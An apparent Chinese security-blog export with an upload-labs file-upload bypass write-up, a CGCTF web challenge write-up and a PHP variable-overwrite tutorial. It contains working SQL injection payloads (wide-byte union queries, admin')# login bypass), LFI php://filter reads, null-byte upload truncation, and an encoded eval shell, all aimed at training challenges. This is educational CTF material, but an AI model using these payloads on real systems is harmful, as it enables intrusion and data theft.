save_name = 1.php%00.jpg post: save_name = 1.php/.、 Pass-20 数组+\\.绕过 代码 12345678910111213141516171819202122232425262728293031323334$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; reset()函数：将内部指针指向数组中的第一个元素，并输出。 end()函数：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。 explode()函数：把字符串打散为数组。 绕过方式 先理清一下函数做了什么操作： 函数执行流程：文件名通过POST方式提交—&gt;MIME白名单校验—&gt;文件后缀白名单校验—&gt;获取文件名拼接到上传的路径。具体而言： 以POST方式上传save_name时，程序会将该参数作为文件名；接着判断该文件名参数save_name是否为数组，若不是则直接.来切分为数组形式；ext变量是调用end()函数取数组最后的一个元素的值，若文件名参数save_name不是数组当然是正常的后缀名，但是若文件名参数save_name是数组则取的就是save_name中最后一个元素值；ext和白名单判断过滤后，通过reset()函数获取文件名，若文件名参数save_name不为数组、此时当然就是正常的文件名，但若文件名参数save_name为数组，则是取save_name中第一个元素值；而最后上传文件的后缀名是直接拼接该语句的值$file[count($file) - 1]即将最后一个元素值作为后缀名。 分析到这里，绕过的关键思路就是：end($file)是jpg、png、gif，而$file最后一个元素是php。 这里可以构造save_name[0] = 1.php/,save_name[2] = jpg，这样的话end($file)为jpg，而$file[count($file) - 1]为$file[1]为空。所以最终file_name=1.php/.，到这里就跟Pass-19一样了。 文件上传漏洞总结 漏洞类型分类 漏洞类型判断方式 Reference 项目地址： https://github.com/c0ny1/upload-labs Upload-labs WriteUp","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"文件上传","slug":"文件上传","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF-Writeup之CGCTF","date":"2019-11-19T12:54:32.000Z","path":"Web_security/ctf_writeup/3.CGCTF-Writeup/","text":"CGCTF Writeup Web 已经决定开始走上了CTF的不归路了，这是第一个练手的CTF，比较适合新手入门学习，有几道题也是看的网上的Writeup，总的来说不是很难吧，重在总结经验和绕过姿势。 传送门 Web 签到题 题干 这一定是最简单的 题解 直接F12查看源代码： **flag：nctf&#123;flag_admiaanaaaaaaaaaaa&#125; ** md5 collision 题干 源码（PHP） 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; 题解 看源码的意思就是，让我们输入一个id，这个id的值不等于QNKCDZO，但是他们的md5码是相同的。 ===比较两个变量的值和类型； ==比较两个变量的值,不比较数据类型。 首先看一下QNKCDZO的md5码是什么：0e830400451993494058024219903391。 md5碰撞原理：一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。例如：123abc转换后应该是123，而abc则为0，0==0这当然是成立的。所以，0 ==’abc’是成立的。当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。 所以，我们只要找到md5加密后以0e开头的字符串就可以绕过==的判断了，这里给大家列举了一写：常见的MD5碰撞：md5值为0e开头 与之类似的还有sha1： aaroZmOk aaK1STfY aaO8zKZF aaO8zKZF aa3OFF9m，这几个字符串经过sha1加密后也是0e开头。 **flag：nctf&#123;md5_collision_is_easy&#125; ** 签到2 提示输入口令。 先把输入框的类型改为text，可以发现只能输入10个字符，即输入框对输入长度进行了限制。 修改一下最大长度，输入zhimakaimen即可。 flag：nctf&#123;follow_me_to_exploit&#125; 这题不是Web 网页中给了一张图片，并且提示这道题不是Web，可以联想到可能是图片隐写术。直接Download图片，用Notepad++打开。 flag：nctf&#123;photo can also hid3 msg&#125; 层层递进 使用F12查看源代码，根据题目提示“层层递进”，这道题使用iframe标签对页面进行嵌套，找到最后一个404.html页面，竟然提示我查看上一个页面。原谅我眼瞎，找了好久，发现隐藏在注释里面。 flag：nctf&#123;this_is_a_fl4g&#125; AAencode 题干 javascript aaencode 题解 上网搜一下javascript aaencode，发现是一种颜文字： JJencode：将JS代码转换成只有符号的字符串 AAencode：将JS代码转换成常用的网络符号 AAencode加密网址： http://utf-8.jp/public/aaencode.html 解密方法：以直接利用浏览器的控制台输入密文，执行后即可解密。 单身二十年 题干 这题可以靠技术也可以靠手速！ 老夫单身二十年，自然靠的是手速！ 题解 看到一个链接，查看源代码，该链接指向./search_key.php 点击链接，我们却去到了./no_key_is_here_forever.php这个页面 猜测是302跳转。 使用Burp Suite抓包，查看Sitemap： **flag：nctf&#123;yougotit_script_now&#125; ** PHP decode 题干 见到的一个类似编码的shell，请解码 12345678910111213141516&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = (base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 题解 这道题直接拿到本地运行这段代码flag不就出来了-_- flag:nctf{gzip_base64_hhhhhh} 文件包含 题干 没错 这就是传说中的LFI 题解 有关文件包含漏洞的利用我在另外一篇博文很详细的介绍了，可以移步于此。 查看index.php页面的源代码： 1http:&#x2F;&#x2F;4.chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php 把结果经过base64解码后得到源代码： 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125; $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 就可以直接到flag:nctf&#123;edulcni_elif_lacol_si_siht&#125; 单身一百年也没用 与第7题类似 flag: nctf&#123;this_is_302_redirect&#125; Cookie 题干 COOKIE就是甜饼的意思~ TIP: 0==not 题解 F12查看request数据包中的cookie字段，发现Login=0。 用BurpSuit抓包修改cookie参数Login=1即可。 flag:nctf&#123;cookie_is_different_from_session&#125; MySQL 题干 不能每一题都这么简单嘛 你说是不是？ 页面提示Do you know robots.txt？ 于是访问http://chinalover.sinaapp.com/web11/robots.txt 返回： 12345678910111213141516171819别太开心，flag不在这，这个文件的用途你看完了？在CTF比赛中，这个文件往往存放着提示信息TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id &#x3D; intval($_GET[id]); $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;)); if ($_GET[id]&#x3D;&#x3D;1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 应该是让我们输入一个id，但他的值不等于1024，但是intval之后和1024相等，那么只要知道intval()函数取整，就很容易了。 payload 1http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web11&#x2F;sql.php?id&#x3D;1024.1 得到flag:nctf&#123;query_in_mysql&#125; 我最先开始没有注意到还有一个提示：TIP:sql.php，导致我在其他路径浪费了很多时间。 GBK Injection 根据题目很容易就能想到这是考察宽字节注入，先来稍微的介绍一下什么是宽字节注入。 宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。例如说PHP的编码为 UTF-8而MySql的编码设置为了 SET NAMES 'gbk'或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。具体来说，假如某个网站有宽字节注入，那么我们提交： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27 这时,假如我们现在使用的是addslashes来过滤,那么就会发生如下的转换过程： 1%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39; 前端输入%df%27时首先经过上面addslashes函数转义变成了%df%5c%27（%5c是反斜杠\\)，之后在数据库查询前因为设置了GBK编码，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。然后MySQL服务器就会对查询语句进行GBK编码即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。 介绍完了宽字节注入的原理，我们再回到这道题目。 首先我们使用宽字节注入来进行绕过，当我们输入%df'，出现如下报错： 1234your sql:select id,title from news where id &#x3D; &#39;1運&#39;&#39;Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK&#x2F;index.php on line 10 发现出现了报错，说明我们的语句已经影响了正常语句的执行了，可以开始注入了。 首先使用order by判断列数： 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;1%df%27%20order%20by%202--+ 发现只有两列，再查询当前数据库名： 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,database()--+ 得到sae-chinalover，接着查询该数据库中的表名： 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+ 得到ctf,ctf2,ctf3,ctf4,gbksqli,news，再查询列名： 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x63746634--+ 这里需要把ctf4转换为十六进制 得到id, flag，最后查询数据： 12http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;SQL-GBK&#x2F;index.php?id&#x3D;-1%df&#39; union select 1,flag from ctf4--+ 得到flag: nctf&#123;gbk_3sqli&#125; /x00 题干 题目有多种解法，你能想出来几种？ 题解 123456789if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;必须输入数字才行&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;骚年，继续努力吧啊~&#x27;; &#125; 根据上面的源码提示，要输入数字并且含有#biubiubiu字符串的nctf参数。 第一种解法： 使用00截断绕过ereg函数，但要注意将#url编码。 12http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00%23biubiubiu 第二种解法： 第一个不等式中ereg函数，当传入参数为数组nctf[]时，NULL != FALSE ，构造成功跳过第一个不等式，第二个不等式中strpos函数传入参数数组之后 NULL != FLASE会返回flag。 **flag:nctf&#123;use_00_to_jieduan&#125; ** Bypass again 题干 依旧是弱类型 来源 hctf 题解 12345678if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125; 与第二道题md5 collision类似,，只需要找到两个字符串经过md5加密后，均以0e开头即可绕过验证。 Payload：?a=QNKCDZO&amp;b=240610708 Flag: nctf&#123;php_is_so_cool&#125; 变量覆盖 题干 听说过变量覆盖么？ 题解 有关变量覆盖的漏洞利用在我的另外一篇博文有详细介绍，可以移步于此。 直接查看source.php文件的关键代码段： 12345678910&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] &#x3D;&#x3D; &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass &#x3D;&#x3D; $thepassword_123) &#123; ?&gt; &lt;div class&#x3D;&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;&#x2F;code&gt; &lt;&#x2F;div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; post数据：pass=1&amp;thepassword_123=1 注意：在页面的输入表单中输入payload无效 伪装者 题干 这是一个到处都有着伪装的世界 题解 提示我们要本地登录，应该就是要我们用一个伪造本地IP地址访问该页面。BurpSuite导入第三方Python脚本可以 实现伪造IP的功能。 附上Python脚本地址：burpFakeIP 上传绕过 题干 猜猜代码怎么写的 题解 既然要猜代码逻辑，那就先一步一步的尝试咯~ 如果不上传任何文件，直接submit： 如果上传php格式文件： 如果上传jpg格式文件： 再使用Burpsuite查看请求包： 尝试在/uploads/后面加上test.php+空格 ： 然后将打开HEX，将test.php后面空格20改为00，构造00截断： 得到flag:nctf{welcome_to_hacks_world} SQL注入1 题干 听说你也会注入？ 题解 关键代码： 12345678910111213141516171819&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; echo &#x27;&lt;/br&gt;&#x27;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 常规SQL注入的题目，使用admin登录，闭合')，截断pw判断： payload：user=admin')#&amp;pass=1 **flag:nctf{ni_ye_hui_sql?} ** pass check 题干 1234567891011121314pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; 题解： strcmp(array,string)==null==0，所以POST一个数组对象即可。 payload: pass[]=qaz flag:nctf{strcmp_is_n0t_3afe} 起名字真难 题干 12345678910111213141516171819202122&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 题解 不能出现1-9之间的数字，那么我们只能尝试将54975581388转成16进制 转换后的结果是ccccccccc，可以使用 payload：?key=0xccccccccc 得到The flag is:nctf&#123;follow_your_dream&#125; 密码重置 题干 重置管理员账号：admin 的密码 你在点击忘记密码之后 你的邮箱收到了一封重置密码的邮件 题解 观察页面可以发现地址栏的参数经过了Base64编码处理，解码得到ctfuser。如果要重置admin的密码，我们抓个包将地址栏参数和POST数据修改一下即可： ?user1=%59%57%52%74%61%57%34%3d user=admin&amp;newpass=1&amp;vcode=1234 flag is:nctf{reset_password_often_have_vuln} SQL Injection 题干 继续注入吧！ TIP:反斜杠可以用来转义 仔细查看相关函数的用法 题解 用F12查看源代码： 12345678910111213141516171819202122#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag; sql语句：SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\'; 观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时既转换双引号又转换单引号。 我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。 构造payload：?username=\\&amp;password= or 1=1#使得查询语句如下： 123456789SELECT * FROM users WHERE name&#x3D;&#39;\\&#39; AND pass&#x3D;&#39; or 1%23&#39;即SELECT * FROM users WHERE name&#x3D;&#39;\\&#39; AND pass&#x3D;&#39; 『 [name]的值为 [&#39; AND pass&#x3D;]，单引号被转义了，显然逻辑值为false 』or 1&#x3D;1 『 但没关系，[false or 1] 的逻辑值为真 』 %23&#39; 『 %23是#的url编码，注释掉多余的单引号 』即select * from users where false or 1 **flag:nctf{sql_injection_is_interesting} ** 综合题 打开后发现是一串看不懂的代码，google一下是jsfuck编码，在线解码网站，直接拖到控制台界面执行得到 1bc29b36f623ba82aaf6724fd3b16718.php。 接着打开这个网站得到提示： 根据提示查看http头信息： history of bash提示我们在Linux系统中有一个.history_bash文件来记录最近若干条bash命令。 所以尝试打开该目录下这个文件 url：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，得到新的提示： 在当前目录下访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip得到**flag: nctf{bash_history_means_what} ** SQL注入2 题干 注入第二题~~主要考察union查询 题解 关键代码： 12345678910111213141516&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27;$user&#x27;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp(str1, str2)：两个字符串相等则返回0 观察一下条件语句 ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) mysql_fetch_array() 函数返回的关联数组中键为字段名 构造payload：post一下数据 user=’ union select md(1)#&amp;pass=1 flag: ntcf{union_select_is_wtf} 综合题2 这道题比较有综合性，我也是看了这篇WriteUp的提示，就做一个知识点的总结吧： 下载提示文件的Python脚本 1234567891011121314import requestsimport codecsfrom bs4 import BeautifulSoupurl=&quot;http://cms.nuptzj.cn/about.php?file=&quot;file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text handle.write(text) SQL注入时需要正确地找到注入点 SQL注入过滤了空格可以使用/**/代替 回调函数后门 密码重置2 题干 12345TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass 题解 查看源代码文件得到管理员邮箱：admin@nuptzj.cn 根据提示，学到一个新知识是非正常关闭vi编辑器时会生成一个.swp文件 查看.index.php.swp和.submit.php.swp文件，能打开.submit.php.swp文件，关键代码如下： 1234567891011121314if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; 要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。 flag:nctf{thanks_to_cumt_bxs} file_get_contents 题干 12345&lt;!--$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; 题解 file_get_contents() 函数将整个文件读入一个字符串 php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。 变量覆盖 题干 变量覆盖，代码审计类题目 1234567&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; 题解 foreach 遍历数组或对象，它会在每次循环中把当前的键名赋给变量 $key，值赋给变量$value。","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"Web安全学习之变量覆盖漏洞利用","date":"2019-11-18T15:22:16.000Z","path":"Web_security/basic_learning/14.变量覆盖漏洞利用/","text":"Web安全学习之变量覆盖漏洞利用 这一篇主要通过几道CTF题讲解一下PHP变量覆盖漏洞利用，主要涉及到extract()函数，parse_str()函数，import_request_variables()函数，$$运算符。 全局变量覆盖 PHP 5.3.0被废弃，PHP5.4.0被移除 PHP中使用变量并不需要初始化，因此register_globals=On时，变量来源可能是各个不同的地方，比如页面的表单、Cookie等。例如： 123456&lt;?phpecho &quot;Register_gl`obals: &quot; . (int)ini_get(&quot;register_globals&quot;) . &quot;&lt;br/&gt;&quot;;if ($auth) &#123; echo &quot;private&quot;;&#125;?&gt; 当register_globals=Off时，这段代码不会有问题： 但是当register_globals=On时，提交http://localhost/variableCover/index.php/?auth=1，变量$auth会自动得到赋值： 如果在代码中已经初始化了$auth变量，也不会有变量覆盖漏洞。 另外通过$GLOBALS获取的变量，也可能导致变量覆盖。 extract()变量覆盖 extract()函数从数组中将变量导入到当前符号表。该函数使用数组键名作为变量名，数组键值作为变量值。针对数组中每一个元素，将在当前符号表中创建对应的一个变量。 函数定义如下： 1int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) 其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是EXTR_OVERWRITE和EXTR_SKIP。 当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为EXTR_SKIP则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE。 当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞，例如： 12345678910&lt;?php$auth = 1;extract($_GET);if($auth == 1)&#123; echo &quot;private&quot;;&#125;else&#123; echo &quot;public&quot;;&#125;?&gt; 在这个例子里，extract()从$_GET中导出变量，从而可以导致任意变量被覆盖，即： parse_str()变量覆盖 函数定义： 1void parse_str (string $str [, array $arr]) 当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞： 12345&lt;?php $a = &#x27;init&#x27;;parse_str($SERVER[&#x27;QUERY_STRING&#x27;]);print $a;?&gt; 再来看一道CTF的题目： 1234567891011121314151617&lt;?phperror_reporting(0);if(empty($_GET[&#x27;id&#x27;])) &#123; show_source(__FILE__); die();&#125; else &#123; include (&#x27;flag.php&#x27;); $a = &quot;www.ca0y1h.top&quot;; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo $flag; &#125; else &#123; exit(&#x27;so easy!&#x27;); &#125;&#125;?&gt; 也就是PHP弱类型和变量覆盖结合的题目： mb_parse_str()变量覆盖 mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似。 import_request_variables()变量覆盖 支持版本：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0 import_request_variables()函数将GET、POST、Cookies中的变量导入到全局。 函数定义如下： 1bool import_request_variables (string $types [, string $prefix]) $type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀，如果没有指定，则将覆盖全局变量。例如： 12345678910&lt;?php$auth = &#x27;0&#x27;;import_request_variables(&#x27;P&#x27;);if ($auth === &#x27;0&#x27;) &#123; echo &quot;private&quot;;&#125;else&#123; echo &quot;public&quot;;&#125;?&gt; $$导致的变量覆盖 $$即可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。例如： 1234567&lt;?php $x = &quot;ca01h&quot;; $$x = 666; echo $x.&quot;&lt;br/&gt;&quot;; echo $$x.&quot;&lt;br/&gt;&quot;; echo $ca01h;?&gt; 其实也就等价于$($x)，输出为： 123ca01h666666 $$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。 123456789101112131415&lt;?phpforeach (array(&#x27;_COOKIE&#x27;,&#x27;_POST&#x27;,&#x27;_GET&#x27;) as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key= $_value; &#125;&#125;$id = isset($id) ? $id : &quot;test&quot;;if($id === &quot;ca01h&quot;) &#123; echo &quot;flag&#123;xxxxxxxxxx&#125;&quot;;&#125; else &#123; echo &quot;Nothing...&quot;;&#125;?&gt; 这里以GET、POST或COOKIE都能触发变量覆盖漏洞，传入id=ca01h后，在foreach语句中，$_key为id，$_value为ca01h，进而$$_key为$id，从而实现了变量覆盖。 最后以一道CTF题为此文章结尾： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)&#123; die(&quot;BugsBunnyCTF is here :p…&quot;);&#125;if ( !isset($_POST[&quot;flag&quot;]) )&#123; die($_403);&#125;foreach ($_GET as $key =&gt; $value)&#123; $$key = $$value;&#125;foreach ($_POST as $key =&gt; $value)&#123; $$key = $value;&#125;if ( $_POST[&quot;flag&quot;] !== $flag ) &#123; die($_403);&#125; else &#123; echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;; die($_200);&#125;?&gt; 可以看到，有3个if语句和2个foreach语句。 在if语句中，第一个需要你是通过POST方式进行请求，第二个是需要POST一个flag参数过去，第三个是比较flag参数和包含进来的真正的flag是否相等。 